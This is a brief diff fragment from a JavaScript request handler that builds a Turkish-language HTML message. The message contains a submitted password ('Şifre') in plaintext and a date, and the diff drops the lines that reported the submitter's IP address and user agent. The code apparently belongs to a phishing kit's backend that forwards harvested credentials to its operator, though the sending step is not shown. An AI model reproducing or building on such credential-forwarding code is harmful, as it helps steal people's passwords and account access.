@@ -102,8 +102,6 @@ export default async function handler(req, res) {
 🔑 <b>Şifre:</b>
 <code>${escapeHtml(password)}</code>
 
-🌐 <b>IP Adresi:</b> <code>${escapeHtml(ip)}</code>
-🖥️ <b>User Agent:</b> ${escapeHtml(userAgent)}
 📅 <b>Tarih:</b> ${escapeHtml(date)}
 
 ---
